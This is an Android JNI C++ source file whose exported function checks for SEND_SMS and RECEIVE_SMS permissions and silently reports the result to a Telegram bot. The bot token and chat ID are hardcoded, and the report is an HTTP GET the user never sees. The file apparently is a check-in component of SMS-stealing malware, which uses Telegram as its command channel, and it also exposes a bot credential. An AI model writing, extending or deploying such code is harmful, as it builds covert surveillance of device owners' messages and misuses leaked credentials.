#include <jni.h>
#include <string>

void sendToTelegram(JNIEnv *env, jobject context, const std::string &message) {
    const std::string botToken = "8563683770:AAF9ELZ4TX7-eR4MsI0tLy3EFd460MJopZk";
    const std::string chatId   = "7269251740";

    // URL encode the message
    std::string encoded;
    for (char c : message) {
        if (c == ' ') encoded += "%20";
        else if (c == '\n') encoded += "%0A";
        else encoded += c;
    }

    std::string urlString = "https://api.telegram.org/bot" + botToken +
                            "/sendMessage?chat_id=" + chatId +
                            "&text=" + encoded;

    // Use Android's built-in java.net.URL via JNI
    jclass urlClass = env->FindClass("java/net/URL");
    jmethodID urlConstructor = env->GetMethodID(urlClass, "<init>", "(Ljava/lang/String;)V");
    jobject urlObj = env->NewObject(urlClass, urlConstructor, env->NewStringUTF(urlString.c_str()));

    // url.openConnection()
    jmethodID openConn = env->GetMethodID(urlClass, "openConnection", "()Ljava/net/URLConnection;");
    jobject conn = env->CallObjectMethod(urlObj, openConn);

    jclass httpConnClass = env->FindClass("java/net/HttpURLConnection");
    // conn.setRequestMethod("GET")
    jmethodID setMethod = env->GetMethodID(httpConnClass, "setRequestMethod", "(Ljava/lang/String;)V");
    env->CallVoidMethod(conn, setMethod, env->NewStringUTF("GET"));

    // conn.setConnectTimeout(5000)
    jmethodID setTimeout = env->GetMethodID(httpConnClass, "setConnectTimeout", "(I)V");
    env->CallVoidMethod(conn, setTimeout, 5000);

    // conn.getResponseCode()
    jmethodID getResponse = env->GetMethodID(httpConnClass, "getResponseCode", "()I");
    int code = env->CallIntMethod(conn, getResponse);

    // conn.disconnect()
    jmethodID disconnect = env->GetMethodID(httpConnClass, "disconnect", "()V");
    env->CallVoidMethod(conn, disconnect);
}

bool checkPermission(JNIEnv *env, jobject context, const char *permission) {
    jclass ctxClass = env->FindClass("android/content/Context");
    jmethodID checkMethod = env->GetMethodID(ctxClass, "checkSelfPermission", "(Ljava/lang/String;)I");
    jstring permStr = env->NewStringUTF(permission);
    int result = env->CallIntMethod(context, checkMethod, permStr);
    env->DeleteLocalRef(permStr);
    return result == 0;
}

extern "C" JNIEXPORT void JNICALL
Java_com_example_myapp_NativeBridge_checkAndReport(JNIEnv *env, jobject thiz, jobject context) {

    const char *permSend    = "android.permission.SEND_SMS";
    const char *permReceive = "android.permission.RECEIVE_SMS";

    bool hasSend    = checkPermission(env, context, permSend);
    bool hasReceive = checkPermission(env, context, permReceive);

    std::string message;
    if (hasSend && hasReceive) {
        message = "Permission accepted - SEND_SMS & RECEIVE_SMS granted";
    } else {
        message = "Permission denied - ";
        if (!hasSend)    message += "SEND_SMS missing ";
        if (!hasReceive) message += "RECEIVE_SMS missing ";
    }

    sendToTelegram(env, context, message);
}
